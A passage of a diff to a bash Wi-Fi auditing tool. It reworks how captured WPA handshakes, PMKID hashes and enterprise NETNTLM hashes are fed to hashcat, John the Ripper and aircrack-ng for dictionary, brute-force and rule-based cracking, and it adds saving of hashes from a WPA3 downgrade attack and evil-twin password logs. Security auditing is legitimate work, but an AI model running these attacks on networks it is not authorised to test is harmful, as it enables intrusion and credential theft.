-					language_strings "${language}" 115 "read"
-					set_hashcat_parameters
-					hashcat_bruteforce_attack_option "personal_pmkid"
-				else
-					echo
-					language_strings "${language}" 679 "red"
-					language_strings "${language}" 115 "read"
-				fi
+				set_hashcat_parameters
+				hashcat_bruteforce_attack_option "personal_handshake_pmkid_hash"
 			fi
 		;;
 		8)
@@ -7986,17 +8225,8 @@ function personal_decrypt_menu() {
 				forbidden_menu_option
 			else
 				get_hashcat_version
-				if validate_hashcat_pmkid_version; then
-					echo
-					language_strings "${language}" 678 "yellow"
-					language_strings "${language}" 115 "read"
-					set_hashcat_parameters
-					hashcat_rulebased_attack_option "personal_pmkid"
-				else
-					echo
-					language_strings "${language}" 679 "red"
-					language_strings "${language}" 115 "read"
-				fi
+				set_hashcat_parameters
+				hashcat_rulebased_attack_option "personal_handshake_pmkid_hash"
 			fi
 		;;
 		*)
@@ -8041,7 +8271,13 @@ function enterprise_decrypt_menu() {
 				forbidden_menu_option
 			else
 				get_jtr_version
-				enterprise_jtr_dictionary_attack_option
+				if ! validate_jtr; then
+					echo
+					language_strings "${language}" 802 "red"
+					language_strings "${language}" 115 "read"
+				else
+					enterprise_jtr_dictionary_attack_option "enterprise"
+				fi
 			fi
 		;;
 		2)
@@ -8049,7 +8285,13 @@ function enterprise_decrypt_menu() {
 				forbidden_menu_option
 			else
 				get_jtr_version
-				enterprise_jtr_bruteforce_attack_option
+				if ! validate_jtr; then
+					echo
+					language_strings "${language}" 802 "red"
+					language_strings "${language}" 115 "read"
+				else
+					enterprise_jtr_bruteforce_attack_option "enterprise"
+				fi
 			fi
 		;;
 		3)
@@ -8118,20 +8360,20 @@ function ask_dictionary() {
 	language_strings "${language}" 181 "yellow"
 }
 
-#Read the user input on Handshake/enterprise file questions
-function ask_capture_file() {
+#Read the user input on Handshake/PMKID/enterprise file questions
+function ask_capture_hash_file() {
 
 	debug_print
 
 	validpath=1
 
-	if [ "${1}" = "personal_handshake" ]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
 		while [[ "${validpath}" != "0" ]]; do
 			read_path "targetfilefordecrypt"
 		done
-	elif [ "${1}" = "personal_pmkid" ]; then
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
 		while [[ "${validpath}" != "0" ]]; do
-			read_path "targethashcatpmkidfilefordecrypt"
+			read_path "targethashcathashfilefordecrypt"
 		done
 	else
 		if [ "${2}" = "hashcat" ]; then
@@ -8147,55 +8389,55 @@ function ask_capture_file() {
 	language_strings "${language}" 189 "yellow"
 }
 
-#Manage the questions on Handshake/enterprise file questions
-function manage_asking_for_captured_file() {
+#Manage the questions on Handshake/PMKID/enterprise file questions
+function manage_asking_for_captured_hashes_file() {
 
 	debug_print
 
-	if [ "${1}" = "personal_handshake" ]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
 		if [ -n "${enteredpath}" ]; then
 			echo
 			language_strings "${language}" 186 "blue"
 			ask_yesno 187 "yes"
 			if [ "${yesno}" = "n" ]; then
-				ask_capture_file "${1}" "${2}"
+				ask_capture_hash_file "${1}" "${2}"
 			fi
 		else
-			ask_capture_file "${1}" "${2}"
+			ask_capture_hash_file "${1}" "${2}"
 		fi
-	elif [ "${1}" = "personal_pmkid" ]; then
-		if [ -n "${hashcatpmkidenteredpath}" ]; then
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+		if [ -n "${hashcathashfileenteredpath}" ]; then
 			echo
-			language_strings "${language}" 677 "blue"
-			ask_yesno 187 "yes"
+			language_strings "${language}" 795 "blue"
+			ask_yesno 800 "yes"
 			if [ "${yesno}" = "n" ]; then
-				ask_capture_file "${1}" "${2}"
+				ask_capture_hash_file "${1}" "${2}"
 			fi
 		else
-			ask_capture_file "${1}" "${2}"
+			ask_capture_hash_file "${1}" "${2}"
 		fi
 	else
 		if [ "${2}" = "hashcat" ]; then
 			if [ -n "${hashcatenterpriseenteredpath}" ]; then
 				echo
 				language_strings "${language}" 600 "blue"
-				ask_yesno 187 "yes"
+				ask_yesno 800 "yes"
 				if [ "${yesno}" = "n" ]; then
-					ask_capture_file "${1}" "${2}"
+					ask_capture_hash_file "${1}" "${2}"
 				fi
 			else
-				ask_capture_file "${1}" "${2}"
+				ask_capture_hash_file "${1}" "${2}"
 			fi
-		else
+		elif [ "${2}" = "jtr"  ]; then
 			if [ -n "${jtrenterpriseenteredpath}" ]; then
 				echo
 				language_strings "${language}" 609 "blue"
-				ask_yesno 187 "yes"
+				ask_yesno 800 "yes"
 				if [ "${yesno}" = "n" ]; then
-					ask_capture_file "${1}" "${2}"
+					ask_capture_hash_file "${1}" "${2}"
 				fi
 			else
-				ask_capture_file "${1}" "${2}"
+				ask_capture_hash_file "${1}" "${2}"
 			fi
 		fi
 	fi
@@ -8251,6 +8493,35 @@ function manage_asking_for_rule_file() {
 	else
 		ask_rules
 	fi
+}
+
+#Check if a hash is present in hostapd-mana log
+function check_mana_hashes() {
+
+	debug_print
+
+	mana_hash=""
+	rm -rf "${tmpdir}${mana_cap_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${mana_tmp_file}" > /dev/null 2>&1
+
+	while true; do
+		if grep -Eqim1 '^MANA: Captured a WPA/2 handshake from:' "${tmpdir}${hostapd_mana_log}"; then
+			if grep -Eqim1 '^MANA WPA2 HASHCAT' "${tmpdir}${hostapd_mana_log}"; then
+				mana_hash=$(grep -Eim1 '^MANA WPA2 HASHCAT' "${tmpdir}${hostapd_mana_log}" | awk -F "\|" '{print $2}' 2> /dev/null | tr -d " ")
+			else
+				hcxhash2cap --hccapx="${tmpdir}${hostapd_mana_out}" -c "${tmpdir}${mana_cap_file}" > /dev/null
+				hcxpcapngtool "${tmpdir}${mana_cap_file}" -o "${tmpdir}${mana_tmp_file}" > /dev/null
+				mana_hash=$(head -n1 "${tmpdir}${mana_tmp_file}")
+			fi
+			break
+		fi
+
+		if ! ps -p "${hostapd_mana_pid}" > /dev/null 2>&1; then
+			break
+		fi
+
+		sleep 3
+	done
 }
 
 #Validate the file to be cleaned
@@ -8347,10 +8618,10 @@ function check_certificates_in_capture_file() {
 	declare -ga certificates_array
 
 	while read -r hexcert; do
-		cert=$(printf "${hexcert}" 2> /dev/null | openssl x509 -inform DER -outform PEM 2>/dev/null)
+		cert=$(printf "${hexcert}" 2> /dev/null | openssl x509 -inform DER -outform PEM 2> /dev/null)
 		[[ -z "${cert}" ]] && continue
 		certificates_array+=("$cert")
-	done < <(tshark -r "${tmpdir}identities_certificates"*.cap -Y "(eap && wlan.addr == ${bssid} && tls.handshake.certificate)" -T fields -e tls.handshake.certificate 2>/dev/null | sort -u | tr -d ':' | sed 's/../\\x&/g')
+	done < <(tshark -r "${tmpdir}identities_certificates"*.cap -Y "(eap && wlan.addr == ${bssid} && tls.handshake.certificate)" -T fields -e tls.handshake.certificate 2> /dev/null | sort -u | tr -d ':' | sed 's/../\\x&/g')
 
 	if [ "${#certificates_array[@]}" -eq 0 ]; then
 		return 1
@@ -8522,20 +8793,45 @@ function select_wpa_bssid_target_from_captured_file() {
 		language_strings "${language}" 115 "read"
 	fi
 
-	local nets_from_file
-	if [ "${2}" = "only_handshake" ]; then
-		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
-	else
-		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
-	fi
-
-	echo
-	if [ "${nets_from_file}" = "" ]; then
-		language_strings "${language}" 216 "red"
+	if ! head -c4 "${1}" 2> /dev/null | grep -Eq "^$(printf '\xd4\xc3\xb2\xa1')"; then
+		echo
+		language_strings "${language}" 796 "red"
 		language_strings "${language}" 115 "read"
 		return 1
 	fi
 
+	handshake_detected_for_offline_decryption=0
+	pmkid_detected_for_offline_decryption=0
+
+	if echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -Eq "WPA \([1-9][0-9]? handshake"; then
+		handshake_detected_for_offline_decryption=1
+		if echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -Eq "handshake, with PMKID"; then
+			pmkid_detected_for_offline_decryption=1
+		fi
+	elif echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -Eq "handshake, with PMKID"; then
+		pmkid_detected_for_offline_decryption=1
+	fi
+
+	local nets_from_file
+
+	echo
+	if [[ "${handshake_detected_for_offline_decryption}" -eq 0 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 0 ]]; then
+		language_strings "${language}" 216 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	elif [[ "${handshake_detected_for_offline_decryption}" -eq 1 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 0 ]]; then
+		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
+		language_strings "${language}" 668 "yellow"
+	elif [[ "${handshake_detected_for_offline_decryption}" -eq 0 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 1 ]]; then
+		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
+		language_strings "${language}" 669 "yellow"
+	elif [[ "${handshake_detected_for_offline_decryption}" -eq 1 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 1 ]]; then
+		nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
+		language_strings "${language}" 670 "yellow"
+	fi
+	language_strings "${language}" 115 "read"
+
+	echo
 	declare -A bssids_detected
 	option_counter=0
 	for item in ${nets_from_file}; do
@@ -8617,7 +8913,7 @@ function validate_enterprise_jtr_file() {
 	readarray -t JTR_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)
 
 	for item in "${JTR_LINES_TO_VALIDATE[@]}"; do
-		if [[ ! "${item}" =~ ^.+:\$NETNTLM\$[[:xdigit:]\$]+$ ]]; then
+		if [[ ! "${item}" =~ ^.+:\$NETNTLM\$[0-9a-fA-F]+\$[0-9a-fA-F]+ ]]; then
 			language_strings "${language}" 607 "red"
 			language_strings "${language}" 115 "read"
 			return 1
@@ -8629,24 +8925,80 @@ function validate_enterprise_jtr_file() {
 	return 0
 }
 
-#Validate if given file has a valid pmkid hashcat format
-function validate_pmkid_hashcat_file() {
+# Check if hashcat hash are correct in a file (first line)
+function check_hashcat_hashes_format() {
 
 	debug_print
 
-	echo
-	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)
+	first_hash_line=""
+	local plain_text_hash_matched=0
+	local deprecated_hash_matched=0
 
-	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
-		if [[ ! "${item}" =~ ^WPA\*[0-9]{2}\*[0-9a-fA-F]{32}\*([0-9a-fA-F]{12}\*){2}[0-9a-fA-F]{18,32}\*+.*$ ]]; then
+	if [ ! -s "${1}" ]; then
+		echo
+		language_strings "${language}" 676 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+
+	if hcxhashtool --info=stdout --hccapx-in="${1}" > /dev/null 2>&1; then
+		deprecated_hash_matched=1
+	else
+		first_hash_line=$(head -n 1 "${1}" 2>/dev/null)
+
+		if [[ -z "${first_hash_line}" ]]; then
+			echo
 			language_strings "${language}" 676 "red"
 			language_strings "${language}" 115 "read"
 			return 1
 		fi
-	done
+	fi
 
-	language_strings "${language}" 675 "blue"
-	language_strings "${language}" 115 "read"
+	if [[ "${first_hash_line}" =~ ^WPA\*[0-9]{2}\*[0-9a-fA-F]{32}\*([0-9a-fA-F]{12}\*){2}[0-9a-fA-F]{16,50}\*+.*$ ]]; then
+		plain_text_hash_matched=1
+	fi
+
+	if [ "${plain_text_hash_matched}" -eq 1 ]; then
+		echo
+		language_strings "${language}" 675 "blue"
+		language_strings "${language}" 115 "read"
+		return 0
+	elif [ "${deprecated_hash_matched}" -eq 1 ]; then
+		echo
+		language_strings "${language}" 675 "blue"
+		echo
+		language_strings "${language}" 798 "yellow"
+		language_strings "${language}" 115 "read"
+
+		if convert_legacy_hashcat_hash_to_new "${1}"; then
+			echo
+			language_strings "${language}" 799 "blue"
+			language_strings "${language}" 115 "read"
+			return 0
+		else
+			echo
+			language_strings "${language}" 417 "red"
+			language_strings "${language}" 115 "read"
+			return 1
+		fi
+
+	else
+		echo
+		language_strings "${language}" 676 "red"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+}
+
+#Convert legacy -m 2500 hashcat format into -m 22000 hashcat format
+function convert_legacy_hashcat_hash_to_new() {
+
+	debug_print
+
+	if ! first_hash_line="$(hcxhashtool --hccapx-in="${1}" --info=stdout 2>/dev/null | awk -F': ' 'BEGIN{found=0} /^HASHLINE/ { s=$2; sub(/\r$/,"", s); print s; found=1; exit } END{ exit (found ? 0 : 1) }')" || [[ "${first_hash_line}" != WPA\*0[12]* ]]; then
+		return 1
+	fi
+
 	return 0
 }
 
@@ -8694,9 +9046,9 @@ function aircrack_dictionary_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "personal_handshake" "aircrack"
+	manage_asking_for_captured_hashes_file "${1}" "aircrack"
 
-	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "pmkid_allowed"; then
+	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 		return
 	fi
 
@@ -8714,13 +9066,13 @@ function aircrack_bruteforce_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "personal_handshake" "aircrack"
+	manage_asking_for_captured_hashes_file "${1}" "aircrack"
 
-	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "pmkid_allowed"; then
+	if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 		return
 	fi
 
-	set_minlength_and_maxlength "personal_handshake"
+	set_minlength_and_maxlength "${1}"
 
 	charset_option=0
 	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || ((charset_option < 1 || charset_option > 11)); do
@@ -8741,7 +9093,7 @@ function enterprise_jtr_dictionary_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "enterprise" "jtr"
+	manage_asking_for_captured_hashes_file "${1}" "jtr"
 
 	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
 		return
@@ -8761,7 +9113,7 @@ function enterprise_jtr_bruteforce_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "enterprise" "jtr"
+	manage_asking_for_captured_hashes_file "${1}" "jtr"
 
 	if ! validate_enterprise_jtr_file "${jtrenterpriseenteredpath}"; then
 		return
@@ -8783,24 +9135,37 @@ function enterprise_jtr_bruteforce_attack_option() {
 	manage_jtr_pot
 }
 
-#Validate and ask for the different parameters used in a hashcat dictionary based attack
+#Validate and ask for the different parameters used in a hashcat dictionary based attack over capture file
 function hashcat_dictionary_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "${1}" "hashcat"
+	manage_asking_for_captured_hashes_file "${1}" "hashcat"
 
-	if [ "${1}" = "personal_handshake" ]; then
-		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 			return
 		fi
 
 		if ! convert_cap_to_hashcat_format; then
 			return
 		fi
-	elif [ "${1}" = "personal_pmkid" ]; then
-		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
+
+		if ! validate_hashcat_pmkid_version && [[ "${handshake_detected_for_offline_decryption}" -eq 0 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 1 ]]; then
+			echo
+			language_strings "${language}" 679 "red"
+			language_strings "${language}" 115 "read"
 			return
+		fi
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+
+		echo
+		language_strings "${language}" 797 "yellow"
+
+		if ! check_hashcat_hashes_format "${hashcathashfileenteredpath}"; then
+			return
+		else
+			echo "${first_hash_line}" > "${tmpdir}${hashcat_tmp_file}"
 		fi
 	else
 		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
@@ -8822,19 +9187,32 @@ function hashcat_bruteforce_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "${1}" "hashcat"
+	manage_asking_for_captured_hashes_file "${1}" "hashcat"
 
-	if [ "${1}" = "personal_handshake" ]; then
-		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 			return
 		fi
 
 		if ! convert_cap_to_hashcat_format; then
 			return
 		fi
-	elif [ "${1}" = "personal_pmkid" ]; then
-		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
+
+		if ! validate_hashcat_pmkid_version && [[ "${handshake_detected_for_offline_decryption}" -eq 0 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 1 ]]; then
+			echo
+			language_strings "${language}" 679 "red"
+			language_strings "${language}" 115 "read"
 			return
+		fi
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+
+		echo
+		language_strings "${language}" 797 "yellow"
+
+		if ! check_hashcat_hashes_format "${hashcathashfileenteredpath}"; then
+			return
+		else
+			echo "${first_hash_line}" > "${tmpdir}${hashcat_tmp_file}"
 		fi
 	else
 		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
@@ -8863,19 +9241,32 @@ function hashcat_rulebased_attack_option() {
 
 	debug_print
 
-	manage_asking_for_captured_file "${1}" "hashcat"
+	manage_asking_for_captured_hashes_file "${1}" "hashcat"
 
-	if [ "${1}" = "personal_handshake" ]; then
-		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}" "only_handshake"; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+		if ! select_wpa_bssid_target_from_captured_file "${enteredpath}"; then
 			return
 		fi
 
 		if ! convert_cap_to_hashcat_format; then
 			return
 		fi
-	elif [ "${1}" = "personal_pmkid" ]; then
-		if ! validate_pmkid_hashcat_file "${hashcatpmkidenteredpath}"; then
+
+		if ! validate_hashcat_pmkid_version && [[ "${handshake_detected_for_offline_decryption}" -eq 0 ]] && [[ "${pmkid_detected_for_offline_decryption}" -eq 1 ]]; then
+			echo
+			language_strings "${language}" 679 "red"
+			language_strings "${language}" 115 "read"
 			return
+		fi
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+
+		echo
+		language_strings "${language}" 797 "yellow"
+
+		if ! check_hashcat_hashes_format "${hashcathashfileenteredpath}"; then
+			return
+		else
+			echo "${first_hash_line}" > "${tmpdir}${hashcat_tmp_file}"
 		fi
 	else
 		if ! validate_enterprise_hashcat_file "${hashcatenterpriseenteredpath}"; then
@@ -8906,9 +9297,11 @@ function manage_hashcat_pot() {
 		if [[ ${hashcat_output} =~ ${regexp} ]]; then
 			pass_decrypted_by_hashcat=1
 		else
-			if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
-				if [ -f "${tmpdir}${hashcat_pot_tmp}" ]; then
-					pass_decrypted_by_hashcat=1
+			if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+				if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
+					if [ -f "${tmpdir}${hashcat_pot_tmp}" ]; then
+						pass_decrypted_by_hashcat=1
+					fi
 				fi
 			fi
 		fi
@@ -8928,16 +9321,16 @@ function manage_hashcat_pot() {
 			hashcat_potpath="${default_save_path}"
 
 			local multiple_users=0
-			if [ "${1}" = "personal_handshake" ]; then
-				hashcatpot_filename="hashcat-${bssid}.txt"
+			if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+				hashcatpot_filename=$(sanitize_path "hashcat-${bssid}.txt")
 				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
-			elif [ "${1}" = "personal_pmkid" ]; then
-				hashcatpot_filename="hashcat-pmkid.txt"
+			elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
+				hashcatpot_filename=$(sanitize_path "hashcat-decrypted-hash.txt")
 				[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
 			else
 				if [[ $(wc -l "${tmpdir}${hashcat_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
 					multiple_users=1
-					hashcatpot_filename="hashcat-enterprise_user-multiple_users.txt"
+					hashcatpot_filename=$(sanitize_path "hashcat-enterprise_user-multiple_users.txt")
 					local enterprise_users=()
 					local hashcat_keys=()
 					readarray -t DECRYPTED_MULTIPLE_USER_PASS < <(uniq "${tmpdir}${hashcat_pot_tmp}" | sort 2> /dev/null)
@@ -8948,7 +9341,7 @@ function manage_hashcat_pot() {
 				else
 					local enterprise_user
 					[[ $(cat "${hashcatenterpriseenteredpath}") =~ ^([^:]+:?[^:]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
-					hashcatpot_filename="hashcat-enterprise_user-${enterprise_user}.txt"
+					hashcatpot_filename=$(sanitize_path "hashcat-enterprise_user-${enterprise_user}.txt")
 					[[ $(cat "${tmpdir}${hashcat_pot_tmp}") =~ .+:(.+)$ ]] && hashcat_key="${BASH_REMATCH[1]}"
 				fi
 			fi
@@ -8966,18 +9359,18 @@ function manage_hashcat_pot() {
 			echo ""
 			} >> "${potenteredpath}"
 
-			if [ "${1}" = "personal_handshake" ]; then
+			if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
 				{
 				echo "BSSID: ${bssid}"
 				} >> "${potenteredpath}"
-			elif [ "${1}" = "personal_pmkid" ]; then
+			elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
 				{
-				echo "${hashcat_texts[${language},0]}:"
+				echo "Hash: ${first_hash_line}"
 				} >> "${potenteredpath}"
 			elif [ "${1}" = "enterprise" ]; then
 				if [ "${multiple_users}" -eq 1 ]; then
 					{
-					echo "${hashcat_texts[${language},3]}:"
+					echo "${hashcat_texts[${language},0]}:"
 					} >> "${potenteredpath}"
 				else
 					{
@@ -9041,7 +9434,7 @@ function manage_jtr_pot() {
 
 			if [[ $(wc -l "${tmpdir}${jtr_pot_tmp}" 2> /dev/null | awk '{print $1}') -gt 1 ]]; then
 				multiple_users=1
-				jtrpot_filename="jtr-enterprise_user-multiple_users.txt"
+				jtrpot_filename=$(sanitize_path "jtr-enterprise_user-multiple_users.txt")
 				local enterprise_users=()
 				local jtr_keys=()
 				readarray -t DECRYPTED_MULTIPLE_PASS < <(uniq "${tmpdir}${jtr_pot_tmp}" | sort 2> /dev/null)
@@ -9052,7 +9445,7 @@ function manage_jtr_pot() {
 			else
 				local enterprise_user
 				[[ $(cat "${jtrenterpriseenteredpath}") =~ ^([^:\$]+:?[^:\$]+) ]] && enterprise_user="${BASH_REMATCH[1]}"
-				jtrpot_filename="jtr-enterprise_user-${enterprise_user}.txt"
+				jtrpot_filename=$(sanitize_path "jtr-enterprise_user-${enterprise_user}.txt")
 				[[ "${jtr_pot}" =~ ^\$NETNTLM\$[^:]+:(.+)$ ]] && jtr_key="${BASH_REMATCH[1]}"
 			fi
 			jtr_potpath="${jtr_potpath}${jtrpot_filename}"
@@ -9126,7 +9519,7 @@ function manage_aircrack_pot() {
 		ask_yesno 235 "yes"
 		if [ "${yesno}" = "y" ]; then
 			aircrack_potpath="${default_save_path}"
-			aircrackpot_filename="aircrack-${bssid}.txt"
+			aircrackpot_filename=$(sanitize_path "aircrack-${bssid}.txt")
 			aircrack_potpath="${aircrack_potpath}${aircrackpot_filename}"
 
 			validpath=1
@@ -9156,6 +9549,41 @@ function manage_aircrack_pot() {
 	fi
 }
 
+#Check if hashes were captured during WPA3 downgrade attack
+function manage_mana_pot() {
+
+	debug_print
+
+	if [ -n "${mana_hash}" ]; then
+		echo
+		language_strings "${language}" 530 "yellow"
+
+		ask_yesno 785 "yes"
+		if [ "${yesno}" = "y" ]; then
+			downgrade_potpath="${default_save_path}"
+			downgradepot_filename=$(sanitize_path "wpa3-downgrade-hash-${bssid}.txt")
+			downgrade_potpath="${downgrade_potpath}${downgradepot_filename}"
+
+			validpath=1
+			while [[ "${validpath}" != "0" ]]; do
+				read_path "downgradepot"
+			done
+
+			{
+			echo "${mana_hash}"
+			} >> "${downgradepotenteredpath}"
+
+			echo
+			language_strings "${language}" 786 "blue"
+			language_strings "${language}" 115 "read"
+		fi
+	else
+		echo
+		language_strings "${language}" 788 "red"
+		language_strings "${language}" 115 "read"
+	fi
+}
+
 #Check if the password was decrypted using asleap against challenges and responses
 function manage_asleap_pot() {
 
@@ -9180,7 +9608,7 @@ function manage_asleap_pot() {
 			if [ "${yesno}" = "y" ]; then
 				local write_to_file=1
 				asleap_potpath="${default_save_path}"
-				asleappot_filename="asleap_decrypted_password.txt"
+				asleappot_filename=$(sanitize_path "asleap_decrypted_password.txt")
 				asleap_potpath="${asleap_potpath}${asleappot_filename}"
 
 				validpath=1
@@ -9306,7 +9734,7 @@ function manage_ettercap_log() {
 	if [ "${yesno}" = "y" ]; then
 		ettercap_log=1
 		default_ettercap_logpath="${default_save_path}"
-		default_ettercaplogfilename="evil_twin_captured_passwords-${essid}.txt"
+		default_ettercaplogfilename=$(sanitize_path "evil_twin_captured_passwords-${essid}.txt")
 		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
 		tmp_ettercaplog="${tmpdir}${ettercap_file}"
 		default_ettercap_logpath="${default_ettercap_logpath}${default_ettercaplogfilename}"
@@ -9327,7 +9755,7 @@ function manage_bettercap_log() {
 	if [ "${yesno}" = "y" ]; then
 		bettercap_log=1
 		default_bettercap_logpath="${default_save_path}"
-		default_bettercaplogfilename="evil_twin_captured_passwords-bettercap-${essid}.txt"
+		default_bettercaplogfilename=$(sanitize_path "evil_twin_captured_passwords-bettercap-${essid}.txt")
 		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
 		tmp_bettercaplog="${tmpdir}${bettercap_file}"
 		default_bettercap_logpath="${default_bettercap_logpath}${default_bettercaplogfilename}"
@@ -9346,9 +9774,9 @@ function manage_wps_log() {
 	wps_potpath="${default_save_path}"
 
 	if [ -z "${wps_essid}" ]; then
-		wpspot_filename="wps_captured_key-${wps_bssid}.txt"
+		wpspot_filename=$(sanitize_path "wps_captured_key-${wps_bssid}.txt")
 	else
-		wpspot_filename="wps_captured_key-${wps_essid}.txt"
+		wpspot_filename=$(sanitize_path "wps_captured_key-${wps_essid}.txt")
 	fi
 	wps_potpath="${wps_potpath}${wpspot_filename}"
 
@@ -9364,7 +9792,7 @@ function manage_wep_log() {
 	debug_print
 
 	wep_potpath="${default_save_path}"
-	weppot_filename="wep_captured_key-${essid}.txt"
+	weppot_filename=$(sanitize_path "wep_captured_key-${essid}.txt")
 	wep_potpath="${wep_potpath}${weppot_filename}"
 
 	validpath=1
@@ -9379,7 +9807,7 @@ function manage_enterprise_log() {
 	debug_print
 
 	enterprise_potpath="${default_save_path}"
-	enterprisepot_suggested_dirname="enterprise_captured-${essid}"
+	enterprisepot_suggested_dirname=$(sanitize_path "enterprise_captured-${essid}")
 	enterprise_potpath="${enterprise_potpath}${enterprisepot_suggested_dirname}/"
 
 	validpath=1
@@ -9427,7 +9855,7 @@ function manage_captive_portal_log() {
 	debug_print
 
 	default_et_captive_portal_logpath="${default_save_path}"
-	default_et_captive_portallogfilename="evil_twin_captive_portal_password-${essid}.txt"
+	default_et_captive_portallogfilename=$(sanitize_path "evil_twin_captive_portal_password-${essid}.txt")
 	default_et_captive_portal_logpath="${default_et_captive_portal_logpath}${default_et_captive_portallogfilename}"
 	validpath=1
 	while [[ "${validpath}" != "0" ]]; do
@@ -9670,7 +10098,10 @@ function set_minlength() {
 	debug_print
 
 	local regexp
-	if [[ "${1}" = "personal_handshake" ]] || [[ "${1}" = "personal_pmkid" ]]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
+		minlength_text=8
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
 		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
 		minlength_text=8
 	else
@@ -9692,7 +10123,9 @@ function set_maxlength() {
 	debug_print
 
 	local regexp
-	if [[ "${1}" = "personal_handshake" ]] || [[ "${1}" = "personal_pmkid" ]]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
+		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
+	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
 		regexp="^[8-9]$|^[1-5][0-9]$|^6[0-3]$"
 	else
 		regexp="^[1-9]$|^[1-5][0-9]$|^6[0-3]$"
@@ -9933,11 +10366,10 @@ function exec_hashcat_dictionary_attack() {
 
 	debug_print
 
-	if [ "${1}" = "personal_handshake" ]; then
+	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
